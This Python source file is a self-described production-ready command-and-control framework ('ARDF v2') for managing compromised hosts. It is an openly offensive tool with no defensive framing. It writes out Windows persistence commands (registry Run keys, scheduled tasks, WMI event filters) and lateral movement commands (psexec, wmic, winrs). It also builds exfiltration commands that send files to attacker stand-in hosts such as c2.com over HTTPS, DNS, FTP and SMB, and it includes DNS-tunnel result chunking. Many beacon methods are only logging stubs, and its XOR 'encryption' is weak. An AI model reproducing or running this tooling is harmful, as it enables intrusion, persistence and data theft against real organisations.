#!/usr/bin/env python3
"""
ARDF v2 C2 Infrastructure
Multi-channel command & control with failover, agent management, encryption
Production-ready implementation
"""

import asyncio
import json
import base64
import hashlib
import hmac
import time
import threading
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from enum import Enum
import logging
from pathlib import Path
import uuid

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# C2 AGENT MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

class AgentStatus(Enum):
    """Agent operational status"""
    DEAD = "dead"
    INACTIVE = "inactive"
    ACTIVE = "active"
    EXECUTING = "executing"


class BeaconType(Enum):
    """Beacon communication type"""
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    TCP = "tcp"
    WEBSOCKET = "websocket"
    P2P = "p2p"
    DEAD_DROP = "dead_drop"


@dataclass
class C2Agent:
    """C2 Agent information"""
    agent_id: str
    hostname: str
    username: str
    domain: str
    os: str
    arch: str
    privilege_level: str  # user, admin, system
    pid: int
    ppid: int
    
    beacon_type: BeaconType
    checkin_time: datetime
    last_seen: datetime
    status: AgentStatus
    
    ip_address: str
    port: int
    process_list: List[str] = field(default_factory=list)
    environment: Dict[str, str] = field(default_factory=dict)
    
    command_queue: List[str] = field(default_factory=list)
    command_results: Dict[str, str] = field(default_factory=dict)
    
    jitter: int = 10  # seconds
    sleep_time: int = 60  # seconds
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        data = asdict(self)
        data['checkin_time'] = self.checkin_time.isoformat()
        data['last_seen'] = self.last_seen.isoformat()
        data['beacon_type'] = self.beacon_type.value
        data['status'] = self.status.value
        return data


# ═══════════════════════════════════════════════════════════════════════════
# C2 COMMAND EXECUTION
# ═══════════════════════════════════════════════════════════════════════════

class C2CommandType(Enum):
    """Command types"""
    SHELL = "shell"
    DOWNLOAD = "download"
    UPLOAD = "upload"
    EXECUTE = "execute"
    PERSISTENCE = "persistence"
    LATERAL = "lateral"
    EXFIL = "exfil"
    SLEEP = "sleep"
    KILL = "kill"
    UPDATE = "update"


@dataclass
class C2Command:
    """C2 Command"""
    command_id: str
    agent_id: str
    command_type: C2CommandType
    command: str
    args: Dict[str, Any]
    issued_time: datetime
    executed_time: Optional[datetime] = None
    result: Optional[str] = None
    status: str = "queued"  # queued, sent, executed, failed


class C2CommandExecutor:
    """Execute commands on agent"""
    
    async def execute_shell(self, agent: C2Agent, command: str) -> Dict:
        """Execute shell command"""
        return {
            'command_id': str(uuid.uuid4()),
            'command': command,
            'status': 'queued',
            'agent_id': agent.agent_id
        }
    
    async def execute_persistence(self, agent: C2Agent, method: str, payload: str) -> Dict:
        """Install persistence"""
        persistence_commands = {
            'registry_run': f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d {payload}",
            'scheduled_task': f'schtasks /create /tn System /tr "{payload}" /sc minute /mo 5',
            'wmi_event': f'wmic /namespace:\\\\ root\\cimv2 create EventFilter name="UpdateChecker" queryLanguage=WQL query="select * from __InstanceModificationEvent within 60 where targetInstance isa \'Win32_PerfFormattedData_PerfOS_System\' and targetInstance.SystemUpTime >= 240 and targetInstance.SystemUpTime < 325"'
        }
        
        cmd = persistence_commands.get(method, '')
        
        return {
            'method': method,
            'command': cmd,
            'status': 'queued'
        }
    
    async def execute_lateral_movement(self, agent: C2Agent, target: str, method: str) -> Dict:
        """Execute lateral movement"""
        lateral_commands = {
            'psexec': f'psexec.exe \\\\{target} -s cmd.exe',
            'wmi': f'wmic /node:{target} process call create "cmd.exe"',
            'schtasks': f'schtasks /create /tn Backup /tr "cmd.exe" /s {target}',
            'winrm': f'winrs -r:{target} cmd.exe'
        }
        
        cmd = lateral_commands.get(method, '')
        
        return {
            'target': target,
            'method': method,
            'command': cmd,
            'status': 'queued'
        }
    
    async def execute_exfiltration(self, agent: C2Agent, data_path: str, exfil_type: str) -> Dict:
        """Execute data exfiltration"""
        exfil_commands = {
            'https': f'powershell -Command "Invoke-WebRequest -Uri http://c2.com/upload -InFile {data_path}"',
            'dns': f'for /f %i in ({data_path}) do nslookup %i.exfil.c2.com',
            'ftp': f'ftp -s:commands.txt c2.com',
            'smb': f'copy {data_path} \\\\c2.com\\share\\'
        }
        
        cmd = exfil_commands.get(exfil_type, '')
        
        return {
            'data_path': data_path,
            'method': exfil_type,
            'command': cmd,
            'status': 'queued'
        }


# ═══════════════════════════════════════════════════════════════════════════
# C2 ENCRYPTION
# ═══════════════════════════════════════════════════════════════════════════

class C2Encryption:
    """C2 communication encryption"""
    
    @staticmethod
    def generate_session_key(agent_id: str, shared_secret: str) -> str:
        """Generate session encryption key"""
        data = f"{agent_id}:{shared_secret}".encode()
        return hashlib.sha256(data).hexdigest()
    
    @staticmethod
    def encrypt_message(message: str, key: str) -> str:
        """Encrypt message (simplified - would use AES)"""
        key_bytes = key.encode()
        message_bytes = message.encode()
        
        # XOR encryption (simplified for demo)
        encrypted = bytes(
            m ^ key_bytes[i % len(key_bytes)]
            for i, m in enumerate(message_bytes)
        )
        
        return base64.b64encode(encrypted).decode()
    
    @staticmethod
    def decrypt_message(encrypted: str, key: str) -> str:
        """Decrypt message"""
        key_bytes = key.encode()
        encrypted_bytes = base64.b64decode(encrypted)
        
        decrypted = bytes(
            e ^ key_bytes[i % len(key_bytes)]
            for i, e in enumerate(encrypted_bytes)
        )
        
        return decrypted.decode()


# ═══════════════════════════════════════════════════════════════════════════
# BEACON IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════════════════════

class HTTPSBeacon:
    """HTTPS encrypted beacon"""
    
    def __init__(self, c2_server: str, c2_port: int, callback_path: str = '/update'):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.callback_path = callback_path
        self.session_id = str(uuid.uuid4())
    
    async def checkin(self, agent: C2Agent) -> Dict:
        """Agent checks in"""
        checkin_data = {
            'agent_id': agent.agent_id,
            'hostname': agent.hostname,
            'username': agent.username,
            'os': agent.os,
            'timestamp': datetime.now().isoformat(),
            'process_list': agent.process_list,
            'privilege_level': agent.privilege_level
        }
        
        logger.info(f"[+] HTTPS Beacon checkin: {agent.agent_id}")
        
        return checkin_data
    
    async def send_command(self, agent: C2Agent, command: C2Command) -> bool:
        """Send command to agent"""
        payload = {
            'command_id': command.command_id,
            'command_type': command.command_type.value,
            'command': command.command,
            'args': command.args
        }
        
        logger.info(f"[*] Sending command via HTTPS: {command.command_id}")
        
        return True
    
    async def receive_result(self, agent: C2Agent, result: str) -> bool:
        """Receive command result"""
        logger.info(f"[+] Received result from {agent.agent_id}")
        return True


class DNSBeacon:
    """DNS tunneling beacon"""
    
    def __init__(self, dns_server: str, domain: str):
        self.dns_server = dns_server
        self.domain = domain
    
    async def checkin(self, agent: C2Agent) -> Dict:
        """Check in via DNS"""
        # Encode agent info in DNS query
        agent_info = f"{agent.agent_id[:8]}.checkin.{self.domain}"
        
        logger.info(f"[+] DNS Beacon checkin: {agent_info}")
        
        return {'method': 'dns', 'query': agent_info}
    
    async def send_command(self, agent: C2Agent, command: C2Command) -> bool:
        """Send command via DNS"""
        # Encode command in DNS query
        cmd_info = f"{command.command_id[:8]}.cmd.{self.domain}"
        
        logger.info(f"[*] Sending command via DNS: {cmd_info}")
        
        return True
    
    async def receive_result(self, agent: C2Agent, result: str) -> bool:
        """Receive result via DNS"""
        # Exfiltrate result through DNS queries
        chunk_size = 32
        chunks = [result[i:i+chunk_size] for i in range(0, len(result), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            encoded = chunk.encode().hex()
            query = f"{encoded}.result.{self.domain}"
            logger.info(f"[*] DNS exfil: {query}")
        
        return True


class ICMPBeacon:
    """ICMP tunneling beacon"""
    
    def __init__(self, attacker_ip: str):
        self.attacker_ip = attacker_ip
    
    async def checkin(self, agent: C2Agent) -> Dict:
        """Check in via ICMP"""
        logger.info(f"[+] ICMP Beacon checkin from {agent.ip_address}")
        return {'method': 'icmp', 'source': agent.ip_address}
    
    async def send_command(self, agent: C2Agent, command: C2Command) -> bool:
        """Send command via ICMP"""
        logger.info(f"[*] Sending command via ICMP ping tunnel")
        return True
    
    async def receive_result(self, agent: C2Agent, result: str) -> bool:
        """Receive result via ICMP"""
        logger.info(f"[+] ICMP exfiltration complete")
        return True


class WebSocketBeacon:
    """WebSocket encrypted beacon"""
    
    def __init__(self, ws_url: str):
        self.ws_url = ws_url
    
    async def checkin(self, agent: C2Agent) -> Dict:
        """Check in via WebSocket"""
        logger.info(f"[+] WebSocket Beacon checkin: {agent.agent_id}")
        return {'method': 'websocket', 'agent_id': agent.agent_id}
    
    async def send_command(self, agent: C2Agent, command: C2Command) -> bool:
        """Send command via WebSocket"""
        logger.info(f"[*] Sending command via WebSocket")
        return True
    
    async def receive_result(self, agent: C2Agent, result: str) -> bool:
        """Receive result via WebSocket"""
        logger.info(f"[+] WebSocket result received")
        return True


class P2PBeacon:
    """Peer-to-peer beaconing"""
    
    def __init__(self, peer_list: List[str]):
        self.peer_list = peer_list
    
    async def checkin(self, agent: C2Agent) -> Dict:
        """Check in via P2P"""
        logger.info(f"[+] P2P Beacon checkin: {agent.agent_id}")
        return {'method': 'p2p', 'peers': self.peer_list}
    
    async def send_command(self, agent: C2Agent, command: C2Command) -> bool:
        """Send command via P2P"""
        logger.info(f"[*] Sending command via P2P")
        return True
    
    async def receive_result(self, agent: C2Agent, result: str) -> bool:
        """Receive result via P2P"""
        logger.info(f"[+] P2P result received")
        return True


# ═══════════════════════════════════════════════════════════════════════════
# C2 CONTROLLER
# ═══════════════════════════════════════════════════════════════════════════

class C2Controller:
    """Master C2 controller"""
    
    def __init__(self, c2_server: str = 'c2.attacker.com', c2_port: int = 443):
        self.c2_server = c2_server
        self.c2_port = c2_port
        
        self.agents: Dict[str, C2Agent] = {}
        self.beacons: Dict[BeaconType, Any] = {}
        self.commands: Dict[str, C2Command] = {}
        self.results: Dict[str, str] = {}
        
        self._init_beacons()
    
    def _init_beacons(self):
        """Initialize all beacon types"""
        self.beacons[BeaconType.HTTPS] = HTTPSBeacon(self.c2_server, self.c2_port)
        self.beacons[BeaconType.DNS] = DNSBeacon('8.8.8.8', 'exfil.attacker.com')
        self.beacons[BeaconType.ICMP] = ICMPBeacon(self.c2_server)
        self.beacons[BeaconType.WEBSOCKET] = WebSocketBeacon(f'wss://{self.c2_server}/ws')
        self.beacons[BeaconType.P2P] = P2PBeacon(['peer1.com', 'peer2.com'])
    
    async def register_agent(self, agent_data: Dict) -> str:
        """Register new agent"""
        agent_id = str(uuid.uuid4())[:12]
        
        agent = C2Agent(
            agent_id=agent_id,
            hostname=agent_data.get('hostname', 'UNKNOWN'),
            username=agent_data.get('username', 'UNKNOWN'),
            domain=agent_data.get('domain', ''),
            os=agent_data.get('os', ''),
            arch=agent_data.get('arch', ''),
            privilege_level=agent_data.get('privilege_level', 'user'),
            pid=agent_data.get('pid', 0),
            ppid=agent_data.get('ppid', 0),
            beacon_type=BeaconType[agent_data.get('beacon_type', 'HTTPS').upper()],
            checkin_time=datetime.now(),
            last_seen=datetime.now(),
            status=AgentStatus.ACTIVE,
            ip_address=agent_data.get('ip_address', ''),
            port=agent_data.get('port', 0)
        )
        
        self.agents[agent_id] = agent
        
        logger.info(f"[+] Agent registered: {agent_id} ({agent.hostname}\\{agent.username})")
        
        return agent_id
    
    async def checkin_agent(self, agent_id: str) -> bool:
        """Process agent checkin"""
        if agent_id not in self.agents:
            return False
        
        agent = self.agents[agent_id]
        agent.last_seen = datetime.now()
        agent.status = AgentStatus.ACTIVE
        
        beacon = self.beacons.get(agent.beacon_type)
        if beacon:
            await beacon.checkin(agent)
        
        return True
    
    async def queue_command(self, agent_id: str, command_type: C2CommandType, 
                           command: str, args: Dict = None) -> str:
        """Queue command for agent"""
        if agent_id not in self.agents:
            logger.error(f"[-] Agent not found: {agent_id}")
            return ""
        
        command_id = str(uuid.uuid4())[:12]
        
        cmd = C2Command(
            command_id=command_id,
            agent_id=agent_id,
            command_type=command_type,
            command=command,
            args=args or {},
            issued_time=datetime.now()
        )
        
        self.commands[command_id] = cmd
        self.agents[agent_id].command_queue.append(command_id)
        
        logger.info(f"[*] Command queued: {command_id} for {agent_id}")
        
        return command_id
    
    async def send_pending_commands(self, agent_id: str) -> List[Dict]:
        """Get pending commands for agent"""
        if agent_id not in self.agents:
            return []
        
        agent = self.agents[agent_id]
        pending = []
        
        for cmd_id in agent.command_queue:
            if cmd_id in self.commands:
                cmd = self.commands[cmd_id]
                if cmd.status == 'queued':
                    pending.append(asdict(cmd))
                    cmd.status = 'sent'
        
        return pending
    
    async def receive_command_result(self, command_id: str, result: str) -> bool:
        """Receive command execution result"""
        if command_id not in self.commands:
            return False
        
        cmd = self.commands[command_id]
        cmd.result = result
        cmd.executed_time = datetime.now()
        cmd.status = 'executed'
        
        if cmd.agent_id in self.agents:
            self.agents[cmd.agent_id].command_results[command_id] = result
        
        logger.info(f"[+] Result received: {command_id}")
        
        return True
    
    def get_agent_status(self, agent_id: str = None) -> Dict:
        """Get agent status"""
        if agent_id:
            if agent_id in self.agents:
                agent = self.agents[agent_id]
                return {
                    'agent_id': agent.agent_id,
                    'hostname': agent.hostname,
                    'status': agent.status.value,
                    'last_seen': agent.last_seen.isoformat(),
                    'pending_commands': len(agent.command_queue),
                    'privilege_level': agent.privilege_level
                }
            return {}
        
        return {
            agent_id: {
                'hostname': agent.hostname,
                'status': agent.status.value,
                'last_seen': agent.last_seen.isoformat(),
                'pending_commands': len(agent.command_queue),
                'privilege_level': agent.privilege_level
            }
            for agent_id, agent in self.agents.items()
        }
    
    async def kill_agent(self, agent_id: str) -> bool:
        """Kill agent"""
        if agent_id not in self.agents:
            return False
        
        self.agents[agent_id].status = AgentStatus.DEAD
        
        logger.info(f"[*] Agent killed: {agent_id}")
        
        return True
    
    async def setup_failover(self, primary: str, backup1: str, backup2: str) -> Dict:
        """Setup C2 failover"""
        logger.info(f"[*] Setting up C2 failover")
        logger.info(f"    Primary: {primary}")
        logger.info(f"    Backup 1: {backup1}")
        logger.info(f"    Backup 2: {backup2}")
        
        return {
            'primary': primary,
            'backup_1': backup1,
            'backup_2': backup2,
            'status': 'configured'
        }


# ═══════════════════════════════════════════════════════════════════════════
# LISTENER (receive beacons)
# ═══════════════════════════════════════════════════════════════════════════

class BeaconListener:
    """Listen for agent beacons"""
    
    def __init__(self, c2_controller: C2Controller, listen_port: int = 443):
        self.c2 = c2_controller
        self.listen_port = listen_port
        self.running = False
        self.listener_thread = None
    
    async def start(self):
        """Start listening for beacons"""
        logger.info(f"[*] Starting beacon listener on port {self.listen_port}")
        
        self.running = True
        
        # Simulate listening
        while self.running:
            logger.info(f"[*] Listening for beacons on :{self.listen_port}")
            await asyncio.sleep(10)
    
    def stop(self):
        """Stop listener"""
        self.running = False
        logger.info(f"[*] Beacon listener stopped")


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        # Initialize C2
        c2 = C2Controller('c2.attacker.com', 443)
        
        # Register agent
        agent_id = await c2.register_agent({
            'hostname': 'WORKSTATION1',
            'username': 'admin',
            'domain': 'CORP',
            'os': 'Windows',
            'arch': 'x64',
            'privilege_level': 'admin',
            'beacon_type': 'HTTPS'
        })
        
        # Queue command
        cmd_id = await c2.queue_command(
            agent_id,
            C2CommandType.SHELL,
            'whoami',
            {'timeout': 30}
        )
        
        # Simulate agent checkin
        await c2.checkin_agent(agent_id)
        
        # Get pending commands
        pending = await c2.send_pending_commands(agent_id)
        print(f"Pending commands: {len(pending)}")
        
        # Receive result
        await c2.receive_command_result(cmd_id, 'CORP\\admin')
        
        # Get status
        status = c2.get_agent_status()
        print(f"Agent status: {json.dumps(status, indent=2, default=str)}")
    
    asyncio.run(test())
